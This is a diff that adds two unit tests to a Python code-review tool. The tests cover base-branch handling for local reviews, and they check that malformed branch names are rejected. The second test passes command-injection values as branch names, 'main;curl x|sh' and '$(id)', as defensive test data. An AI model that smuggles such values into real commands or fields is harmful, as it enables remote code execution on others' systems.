@@ -152,6 +152,41 @@ class TestLocalReview(LocalCase):
 		guide = self.start()["guide"]
 		self.assertIn(STRICTNESS[3], guide)
 
+	def test_a_change_to_another_branch_has_that_base_branch(self):
+		# guard#21: the change starts from a hotfix branch, not from the default branch.
+		self.repo.branch_off("hotfix")
+		hotfix = self.repo.commit({"app/hotfix.py": "FIX = 1\n"}, "a hotfix")
+		(self.repo.path / "app/models.py").write_text(NEW_SIGNATURE)
+		diff = self.repo.git("diff", "--binary", hotfix) + "\n"
+		review_id, secret = local.begin(self.full_name, base_branch="hotfix")
+		local.receive(review_id, secret, diff.encode(), hotfix, "feature")
+		guide = local.context_for(review_id)["guide"]
+		self.assertIn(f"Base: {hotfix}, the merge base with branch hotfix.", guide)
+		self.assertNotIn("app/hotfix.py", guide)
+		local.submit(review_id, [])
+
+		store = store_for(self.repository)
+		change = store.diff(self.base, hotfix)
+		run = local.change_run(self.repository, store, self.base, hotfix, change, "feature", "hotfix")
+		self.assertEqual(run.base_branch, "hotfix")
+		# The config still comes from the default branch, as on a pull request to a hotfix branch.
+		self.assertEqual(run.config_sha, store.rev_parse("refs/heads/main"))
+		# Without a base branch, it is the default branch.
+		run = local.change_run(self.repository, store, self.base, hotfix, change, "feature")
+		self.assertEqual(run.base_branch, "main")
+		self.assertIn("the merge base with branch main.", self.start()["guide"])
+
+	def test_the_upload_can_name_the_base_branch_and_an_unsafe_one_fails(self):
+		with self.assertRaisesRegex(frappe.ValidationError, "not a branch name"):
+			local.begin(self.full_name, base_branch="main;curl x|sh")
+		review_id, secret = local.begin(self.full_name)
+		diff = self.working_tree_diff().encode()
+		with self.assertRaisesRegex(frappe.ValidationError, "not a branch name"):
+			local.receive(review_id, secret, diff, self.base, base_branch="$(id)")
+		# The review keeps waiting, and the pre-push hook names the branch that it chose.
+		local.receive(review_id, secret, diff, self.base, base_branch="version-15")
+		self.assertIn("the merge base with branch version-15.", local.context_for(review_id)["guide"])
+
 	def test_a_default_branch_that_the_mirror_does_not_have_stops_the_review(self):
 		# No other commit is a safe source of config, so Guard says what is wrong.
 		frappe.db.set_value("Code Repository", self.repository, "default_branch", "master")
